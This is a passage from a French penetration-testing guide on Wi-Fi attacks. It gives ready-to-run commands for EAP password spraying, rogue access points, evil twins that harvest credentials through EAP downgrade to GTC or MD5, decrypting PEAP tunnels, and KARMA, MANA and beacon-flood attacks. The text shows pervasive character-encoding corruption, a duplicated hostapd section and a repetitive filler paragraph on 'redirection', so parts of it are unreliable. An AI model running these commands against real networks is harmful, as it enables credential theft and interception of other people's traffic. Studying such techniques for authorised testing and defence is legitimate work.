Avec l'un ou l'autre protocole, le serveur PEAP/TTLS apprend la v√©ritable identit√© de l'utilisateur une fois que le tunnel TLS a √©t√© √©tabli. La v√©ritable identit√© peut √™tre sous la forme de l'utilisateur@domaine ou simplement de l'utilisateur. Si le serveur PEAP/TTLS authentifie √©galement l'utilisateur, il conna√Æt maintenant l'identit√© de l'utilisateur et proc√®de √† la m√©thode d'authentification prot√©g√©e par le tunnel TLS. Alternativement, le serveur PEAP/TTLS peut transmettre une nouvelle demande RADIUS au serveur RADIUS d'origine de l'utilisateur. Cette nouvelle demande RADIUS a le protocole PEAP ou TTLS supprim√©. Si la m√©thode d'authentification prot√©g√©e est EAP, les messages EAP internes sont transmis au serveur RADIUS d'origine de l'utilisateur sans l'enveloppe EAP-PEAP ou EAP-TTLS. L'attribut User-Name du message RADIUS sortant contient la v√©ritable identit√© de l'utilisateur - pas l'identit√© anonyme de l'attribut User-Name de la demande RADIUS entrante. Si la m√©thode d'authentification prot√©g√©e est PAP ou CHAP (prise en charge uniquement par TTLS), les attributs d'authentification User-Name et autres r√©cup√©r√©s √† partir de la charge utile TLS sont plac√©s dans le message RADIUS sortant √† la place de l'attribut User-Name anonyme et des attributs EAP-Message TTLS inclus dans la demande RADIUS entrante.

### EAP-Bruteforce (password spray)

Si le client est cens√© utiliser un nom d'utilisateur et un mot de passe (remarquez que EAP-TLS ne sera pas valide dans ce cas), vous pouvez essayer d'obtenir une liste de noms d'utilisateur (voir la partie suivante) et de mots de passe et essayer de forcer l'acc√®s en utilisant air-hammer.
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Vous pouvez √©galement effectuer cette attaque en utilisant `eaphammer`:
```bash
./eaphammer --eap-spray \
	--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
	--essid example-wifi \
	--password bananas \
	--user-list users.txt
```
## Th√©orie des attaques client

### S√©lection de r√©seau et itin√©rance

Bien que le protocole 802.11 ait des r√®gles tr√®s sp√©cifiques qui dictent comment une station peut rejoindre un ESS, il ne sp√©cifie pas comment la station doit s√©lectionner un ESS auquel se connecter. De plus, le protocole permet aux stations de se d√©placer librement entre les points d'acc√®s qui partagent le m√™me ESSID (car vous ne voudriez pas perdre la connectivit√© WiFi en marchant d'une extr√©mit√© d'un b√¢timent √† l'autre, etc.). Cependant, le protocole 802.11 ne sp√©cifie pas comment ces points d'acc√®s doivent √™tre s√©lectionn√©s. De plus, m√™me si les stations doivent √™tre authentifi√©es √† l'ESS pour s'associer √† un point d'acc√®s, le protocole 802.11 ne n√©cessite pas que le point d'acc√®s soit authentifi√© √† la station.

### Listes de r√©seaux pr√©f√©r√©s (PNL)

Chaque fois qu'une station se connecte √† un r√©seau sans fil, l'ESSID du r√©seau est stock√© dans la liste de r√©seaux pr√©f√©r√©s (PNL) de la station. La PNL est une liste ordonn√©e de tous les r√©seaux auxquels la station s'est connect√©e dans le pass√©, et chaque entr√©e de la PNL contient l'ESSID du r√©seau et toutes les informations de configuration sp√©cifiques au r√©seau n√©cessaires pour √©tablir une connexion.

### Balayage passif

Dans les r√©seaux d'infrastructure, les points d'acc√®s transmettent p√©riodiquement des trames de balise pour annoncer leur pr√©sence et leurs capacit√©s aux stations √† proximit√©. Les balises sont des trames diffus√©es, ce qui signifie qu'elles sont destin√©es √† √™tre re√ßues par toutes les stations √† proximit√© dans la plage. Les balises incluent des informations sur les taux pris en charge par l'AP, les capacit√©s de chiffrement, des informations suppl√©mentaires, et surtout, les trames de balise contiennent l'ESSID de l'AP (tant que la diffusion de l'ESSID n'est pas d√©sactiv√©e).

Lors du balayage passif, le dispositif client √©coute les trames de balise des points d'acc√®s √† proximit√©. Si le dispositif client re√ßoit une trame de balise dont le champ ESSID correspond √† un ESSID de la PNL du client, le client se connectera automatiquement au point d'acc√®s qui a envoy√© la trame de balise. Ensuite, supposons que nous voulions cibler un dispositif sans fil qui n'est actuellement connect√© √† aucun sans fil. Si nous connaissons au moins une entr√©e dans la PNL de ce client, nous pouvons forcer le client √† se connecter √† nous simplement en cr√©ant notre propre point d'acc√®s avec l'ESSID de cette entr√©e.

### Exploration active

Le deuxi√®me algorithme de s√©lection de r√©seau utilis√© dans 802.11 est connu sous le nom d'exploration active. Les dispositifs clients qui utilisent l'exploration active transmettent continuellement des trames de demande de sondage pour d√©terminer quels AP sont √† port√©e, ainsi que leurs capacit√©s. Les demandes de sondage se pr√©sentent sous deux formes : adress√©es et diffus√©es. Les demandes de sondage adress√©es sont adress√©es √† un ESSID sp√©cifique, et c'est la fa√ßon dont le client v√©rifie si un r√©seau sp√©cifique est √† proximit√©.

Les clients qui utilisent l'exploration adress√©e enverront des demandes de sondage pour chaque r√©seau de leur PNL. Il convient de noter que l'exploration adress√©e est le seul moyen d'identifier la pr√©sence de r√©seaux cach√©s √† proximit√©. Les demandes de sondage diffus√©es fonctionnent presque exactement de la m√™me mani√®re, mais sont envoy√©es avec le champ SSID d√©fini sur NULL. Cela adresse la demande de sondage √† tous les points d'acc√®s √† proximit√©, permettant √† la station de v√©rifier si l'un de ses r√©seaux pr√©f√©r√©s est √† proximit√© sans r√©v√©ler le contenu de sa PNL.

## Simple point d'acc√®s avec redirection vers Internet

Avant d'expliquer comment effectuer des attaques plus complexes, il va √™tre expliqu√© **comment** simplement **cr√©er** un **point d'acc√®s** et **rediriger** son **trafic** vers une interface connect√©e **√†** **Internet**.

En utilisant `ifconfig -a`, v√©rifiez que l'interface wlan pour cr√©er le point d'acc√®s et l'interface connect√©e √† Internet sont pr√©sentes.

### DHCP et DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Cr√©ez un fichier de configuration _/etc/dnsmasq.conf_ comme suit :
```
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Ensuite, **d√©finissez les adresses IP** et les **routes** :
```
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Et ensuite **d√©marrer** dnsmasq:
```
dnsmasq -C dnsmasq.conf -d
```
### hostapd

### Description
`hostapd` est un d√©mon qui impl√©mente le protocole d'acc√®s au r√©seau sans fil IEEE 802.11. Il peut √™tre utilis√© pour cr√©er un point d'acc√®s sans fil ou pour authentifier les clients sans fil √† un r√©seau existant.

### Installation
```
sudo apt-get install hostapd
```

### Configuration
La configuration de `hostapd` se fait via le fichier `/etc/hostapd/hostapd.conf`. Voici un exemple de configuration pour un point d'acc√®s sans fil WPA2-PSK :

```
interface=wlan0
driver=nl80211
ssid=MyAP
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=MyPassphrase
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
```

### Utilisation
Pour d√©marrer le point d'acc√®s sans fil, ex√©cutez la commande suivante :
```
sudo hostapd /etc/hostapd/hostapd.conf
```
```
apt-get install hostapd
```
Cr√©ez un fichier de configuration _hostapd.conf_ :
```
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Arr√™ter les processus g√™nants**, mettre en **mode monitor**, et **d√©marrer hostapd** :
```
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Redirection et redirection

La redirection est une technique courante utilis√©e pour rediriger le trafic r√©seau d'une machine √† une autre. Cela peut √™tre utile pour contourner les pare-feu ou pour rediriger le trafic vers une machine compromise. Il existe plusieurs outils pour effectuer des redirections, notamment `socat`, `netcat`, `ssh` et `sslh`.

La redirection peut √©galement √™tre utilis√©e pour rediriger le trafic vers des ports diff√©rents sur la m√™me machine. Cela peut √™tre utile pour contourner les restrictions de pare-feu ou pour masquer le trafic en le faisant passer pour un autre service.

La redirection peut √©galement √™tre utilis√©e pour rediriger le trafic vers des domaines diff√©rents. Cela peut √™tre utile pour contourner les restrictions de pare-feu ou pour masquer le trafic en le faisant passer pour un autre domaine. Les outils couramment utilis√©s pour cela sont `sslstrip` et `mitmproxy`.

La redirection peut √©galement √™tre utilis√©e pour rediriger le trafic vers des adresses IP diff√©rentes. Cela peut √™tre utile pour contourner les restrictions de pare-feu ou pour masquer le trafic en le faisant passer pour une autre adresse IP. Les outils couramment utilis√©s pour cela sont `dnsspoof` et `mitmproxy`.
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Jumeau Mal√©fique

Une attaque de jumeau mal√©fique est un type d'attaque Wi-Fi qui fonctionne en exploitant le fait que la plupart des ordinateurs et des t√©l√©phones ne verront que le "nom" ou l'ESSID d'un r√©seau sans fil (car la station de base n'est pas tenue de s'authentifier contre le client). Cela rend en fait tr√®s difficile la distinction entre les r√©seaux portant le m√™me nom et le m√™me type de chiffrement. En fait, de nombreux r√©seaux auront plusieurs points d'acc√®s √©tendant le r√©seau, tous utilisant le m√™me nom pour √©tendre l'acc√®s sans perturber les utilisateurs.

En raison de la fa√ßon dont fonctionnent les clients (rappelez-vous que le protocole 802.11 permet aux stations de se d√©placer librement entre les points d'acc√®s au sein du m√™me ESS), il est possible de faire en sorte qu'un appareil change de station de base √† laquelle il est connect√©. Cela est possible en offrant un meilleur signal (ce qui n'est pas toujours possible) ou en bloquant l'acc√®s √† la station de base d'origine (paquets de d√©sauthentification, brouillage ou une autre forme d'attaque DoS).

Notez √©galement que les d√©ploiements sans fil du monde r√©el ont g√©n√©ralement plus d'un point d'acc√®s, et que ces points d'acc√®s sont souvent plus puissants et ont une meilleure port√©e de ligne de vue en raison de leur placement vers le plafond. La d√©sauthentification d'un seul point d'acc√®s entra√Æne g√©n√©ralement le passage de la cible vers un autre point d'acc√®s valide plut√¥t que vers votre AP malveillant, √† moins que tous les points d'acc√®s √† proximit√© ne soient d√©sauthentifi√©s (bruyants) ou que vous soyez tr√®s prudent dans le placement de l'AP malveillant (difficile).

Vous pouvez cr√©er un jumeau mal√©fique ouvert tr√®s basique (sans capacit√© √† router le trafic vers Internet) en faisant :
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Vous pouvez √©galement cr√©er un Twin Mal√©fique en utilisant **eaphammer** (remarquez que pour cr√©er des twins mal√©fiques avec eaphammer, l'interface **NE DOIT PAS √™tre** en mode **monitor**):
```
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou en utilisant Airgeddon: `Options: 5,6,7,8,9 (dans le menu de l'attaque Evil Twin).`

![](<../../.gitbook/assets/image (148).png>)

Veuillez noter que par d√©faut, si un ESSID dans la PNL est enregistr√© comme prot√©g√© par WPA, l'appareil ne se connectera pas automatiquement √† un evil twin ouvert. Vous pouvez essayer de DoS le vrai AP et esp√©rer que l'utilisateur se connectera manuellement √† votre Open evil twin, ou vous pouvez DoS le vrai AP et utiliser un WPA Evil Twin pour capturer le handshake (en utilisant cette m√©thode, vous ne pourrez pas laisser la victime se connecter √† vous car vous ne connaissez pas le PSK, mais vous pouvez capturer le handshake et essayer de le casser).

Certains syst√®mes d'exploitation et antivirus avertiront l'utilisateur que se connecter √† un r√©seau ouvert est dangereux...

### Evil Twin WPA/WPA2

Vous pouvez cr√©er un **Evil Twin en utilisant WPA/2** et si les appareils sont configur√©s pour se connecter √† cet SSID avec WPA/2, ils vont essayer de se connecter. Cependant, **pour compl√©ter le 4-way-handshake**, vous devez √©galement **conna√Ætre** le **mot de passe** que le client va utiliser. Si vous ne le **connaissez pas**, la **connexion ne sera pas compl√©t√©e**.
```
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Evil Twin d'entreprise

Pour comprendre ces attaques, je recommande de lire d'abord la br√®ve explication sur [WPA Enterprise](./#wpa-enterprise-mgt).

**Utilisation de hostapd-wpe**

`hostapd-wpe` a besoin d'un fichier de **configuration** pour fonctionner. Pour **automatiser** la g√©n√©ration de ces configurations, vous pouvez utiliser [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (t√©l√©chargez le fichier python √† l'int√©rieur de _/etc/hostapd-wpe/_).
```
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Dans le fichier de configuration, vous pouvez s√©lectionner de nombreuses options diff√©rentes telles que ssid, canal, fichiers utilisateur, cret/key, param√®tres dh, version wpa et auth...

[**Utilisation de hostapd-wpe avec EAP-TLS pour permettre √† n'importe quel certificat de se connecter.**](evil-twin-eap-tls.md)

**Utilisation d'EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Par d√©faut, EAPHammer propose ces m√©thodes d'authentification (remarquez que GTC est le premier √† essayer d'obtenir des mots de passe en texte clair, puis l'utilisation de m√©thodes d'authentification plus robustes):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Voici la m√©thodologie par d√©faut pour √©viter les longs temps de connexion. Cependant, vous pouvez √©galement sp√©cifier au serveur les m√©thodes d'authentification du plus faible au plus fort :
```
--negotiate weakest
```
Ou vous pouvez √©galement utiliser :

* `--negotiate gtc-downgrade` pour utiliser une impl√©mentation de r√©trogradation GTC hautement efficace (mots de passe en texte clair)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` pour sp√©cifier manuellement les m√©thodes offertes (en offrant les m√™mes m√©thodes d'authentification dans le m√™me ordre que l'organisation, l'attaque sera beaucoup plus difficile √† d√©tecter).
* [Trouvez plus d'informations dans le wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Utilisation d'Airgeddon**

`Airgeddon` peut utiliser des certificats g√©n√©r√©s pr√©c√©demment pour offrir une authentification EAP aux r√©seaux WPA/WPA2-Enterprise. Le faux r√©seau r√©trograde le protocole de connexion vers EAP-MD5 afin de pouvoir **capturer l'utilisateur et le MD5 du mot de passe**. Plus tard, l'attaquant peut essayer de craquer le mot de passe.\
`Airggedon` vous offre la possibilit√© d'une **attaque Evil Twin continue (bruyante)** ou de **cr√©er uniquement l'attaque Evil jusqu'√† ce que quelqu'un se connecte (lisse).**

![](<../../.gitbook/assets/image (129).png>)

### D√©bogage des tunnels TLS PEAP et EAP-TTLS dans les attaques Evil Twins

_Cette m√©thode a √©t√© test√©e dans une connexion PEAP mais comme je d√©crypte un tunnel TLS arbitraire, cela devrait √©galement fonctionner avec EAP-TTLS_

Dans la **configuration** de _hostapd-wpe_, **commentez** la ligne qui contient _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` √† `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Cela fera en sorte que `hostapd-wpe` **√©change des cl√©s en utilisant RSA** au lieu de DH, vous pourrez donc **d√©crypter** le trafic plus tard en **connaissant la cl√© priv√©e du serveur**.

Maintenant, d√©marrez l'**Evil Twin** en utilisant **`hostapd-wpe`** avec cette configuration modifi√©e comme d'habitude. D√©marrez √©galement **`wireshark`** dans l'**interface** qui effectue l'attaque Evil Twin.

Maintenant ou plus tard (lorsque vous avez d√©j√† captur√© certaines tentatives d'authentification), vous pouvez ajouter la cl√© priv√©e RSA √† wireshark dans : `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Ajoutez une nouvelle entr√©e et remplissez le formulaire avec ces valeurs : **Adresse IP = any** -- **Port = 0** -- **Protocole = data** -- **Fichier de cl√©** (**s√©lectionnez votre fichier de cl√©**, pour √©viter les probl√®mes, s√©lectionnez un fichier de cl√© **sans protection par mot de passe**).

![](<../../.gitbook/assets/image (151).png>)

Et regardez le nouvel onglet **"TLS d√©crypt√©"** :

![](<../../.gitbook/assets/image (152).png>)

## Attaque KARMA, MANA, Loud MANA et Known beacons

### Listes noires/blanches ESSID et MAC

Le tableau suivant r√©pertorie les diff√©rents types de MFACL (Listes de contr√¥le d'acc√®s de trame de gestion) disponibles, ainsi que leurs effets lorsqu'ils sont utilis√©s :

![](<../../.gitbook/assets/image (149).png>)
```
# example EAPHammer MFACL file, wildcards can be used
78:f0:97:fc:b5:36
9a:35:e1:01:4f:cf
69:19:14:60:20:45
ce:52:b8:*:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```
# example ESSID-based MFACL file
apples
oranges
grapes
pears

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Les attaques Karma sont une deuxi√®me forme d'attaque de point d'acc√®s frauduleux qui exploite le processus de s√©lection de r√©seau utilis√© par les stations. Dans un livre blanc √©crit en 2005, Dino Dai Zovi et Shane Macaulay d√©crivent comment un attaquant peut configurer un point d'acc√®s pour √©couter les demandes de sondage dirig√©es et y r√©pondre avec des r√©ponses de sondage dirig√©es correspondantes. Cela am√®ne les stations affect√©es √† envoyer automatiquement une demande d'association au point d'acc√®s de l'attaquant. Le point d'acc√®s r√©pond ensuite avec une r√©ponse d'association, ce qui am√®ne les stations affect√©es √† se connecter √† l'attaquant.

### MANA

Selon Ian de Villiers et Dominic White, les stations modernes sont con√ßues pour se prot√©ger contre les attaques Karma en ignorant les r√©ponses de sondage dirig√©es des points d'acc√®s qui n'ont pas d√©j√† r√©pondu √† au moins une demande de sondage de diffusion. Cela a entra√Æn√© une baisse significative du nombre de stations vuln√©rables aux attaques Karma jusqu'en 2015, lorsque White et de Villiers ont d√©velopp√© un moyen de contourner de telles protections. Dans l'attaque Karma am√©lior√©e de White et de Villiers (attaque MANA), les r√©ponses de sondage dirig√©es sont utilis√©es pour reconstruire les PNL des stations voisines. Lorsqu'une demande de sondage de diffusion est re√ßue d'une station, le point d'acc√®s de l'attaquant r√©pond avec un SSID arbitraire provenant de la PNL de la station d√©j√† vu dans une demande de sondage direct de ce p√©riph√©rique.

En r√©sum√©, l'algorithme MANA fonctionne comme suit : chaque fois que le point d'acc√®s re√ßoit une demande de sondage, il d√©termine d'abord s'il s'agit d'un sondage de diffusion ou dirig√©. S'il s'agit d'un sondage dirig√©, l'adresse MAC de l'exp√©diteur est ajout√©e √† la table de hachage (si elle n'y est pas d√©j√†) et l'ESSID est ajout√© √† la PNL de ce p√©riph√©rique. Le point d'acc√®s r√©pond ensuite avec une r√©ponse de sondage dirig√©e. S'il s'agit d'un sondage de diffusion, le point d'acc√®s r√©pond avec des r√©ponses de sondage pour chacun des r√©seaux dans la PNL de ce p√©riph√©rique.

Attaque MANA utilisant eaphammer :
```
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Notez que l'attaque MANA standard ne nous permet toujours pas d'attaquer les appareils qui n'utilisent pas de sondage dirig√© du tout. Donc, si nous ne connaissons pas non plus une entr√©e pr√©c√©dente dans le PNL de l'appareil, nous devons trouver un autre moyen de l'attaquer.

Une possibilit√© est ce qu'on appelle l'attaque Loud MANA. Cette attaque repose sur l'id√©e que les appareils clients √† proximit√© physique les uns des autres ont probablement au moins quelques entr√©es communes dans leurs PNL.

En r√©sum√©, l'attaque Loud MANA, au lieu de r√©pondre aux demandes de sondage avec chaque ESSID dans le PNL d'un appareil particulier, l'AP malveillant envoie des r√©ponses de sondage pour chaque ESSID dans chaque PNL de tous les appareils qu'il a vus auparavant. En relation avec la th√©orie des ensembles, nous pouvons dire que l'AP envoie des r√©ponses de sondage pour chaque ESSID dans l'union de tous les PNL des appareils √† proximit√©.
```
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Attaque de Beacon connue

Il existe encore des cas o√π l'attaque Loud MANA ne r√©ussira pas.\
L'attaque de Beacon connue est une fa√ßon de "forcer" les ESSIDs pour essayer de faire connecter la victime √† l'attaquant. L'attaquant cr√©e un AP qui r√©pond √† n'importe quel ESSID et ex√©cute un code envoyant des balises en falsifiant les ESSIDs de chaque nom dans une liste de mots. Avec un peu de chance, la victime contiendra certains de ces noms d'ESSID dans sa PNL et essaiera de se connecter au faux AP.\
Eaphammer a impl√©ment√© cette attaque en tant qu'attaque MANA o√π tous les ESSIDs dans une liste sont charg√©s (vous pouvez √©galement combiner cela avec `--loud` pour cr√©er une attaque Loud MANA + Known beacons):
```
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Attaque de rafale de balises connues**

Comme les balises connues sont bruyantes, vous pouvez utiliser un script √† l'int√©rieur du projet Eaphammer pour simplement lancer des balises pour chaque nom ESSID dans un fichier tr√®s rapidement. Si vous combinez ce script avec une attaque MANA Eaphammer, les clients pourront se connecter √† votre point d'acc√®s.
```
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
 --bssid de:ad:be:ef:13:37 \
 --known-essids-file known-s.txt \
 --dst-addr 11:22:33:11:22:33 \
 --burst-count 5
```
## Wi-Fi Direct

Wi-Fi Direct est une norme Wi-Fi qui permet aux appareils de se connecter les uns aux autres sans point d'acc√®s sans fil, car l'un des deux appareils agira en tant que point d'acc√®s (appel√© propri√©taire de groupe). Vous pouvez trouver Wi-Fi Direct dans de nombreux appareils IoT tels que les imprimantes, les t√©l√©viseurs...

Wi-Fi Direct s'appuie sur Wi-Fi Protected Setup (**WPS**) pour connecter les appareils de mani√®re s√©curis√©e. WPS dispose de plusieurs m√©thodes de configuration telles que la configuration **Push-Button** (PBC), la saisie de **code PIN** et la **communication en champ proche** (NFC).

Ainsi, les attaques pr√©c√©demment vues sur le code PIN WPS sont √©galement valables ici si le code PIN est utilis√©.

### Piratage EvilDirect

Cela fonctionne comme un Evil-Twin mais pour Wi-Fi direct, vous pouvez vous faire passer pour un propri√©taire de groupe pour essayer de faire connecter d'autres appareils comme des t√©l√©phones √† vous : `airbase-ng -c 6 -e DIRECT-5x-BRAVIA -a BB:BB:BB:BB:BB:BB mon0`

## R√©f√©rences

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)

TODO: Jetez un coup d'≈ìil √† [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (connexion avec Facebook et imitation de WPA dans les portails captifs)

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

üêû Lisez les tutoriels sur les bugs web3

üîî Recevez des notifications sur les nouveaux programmes de primes pour bugs

üí¨ Participez aux discussions de la communaut√©

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
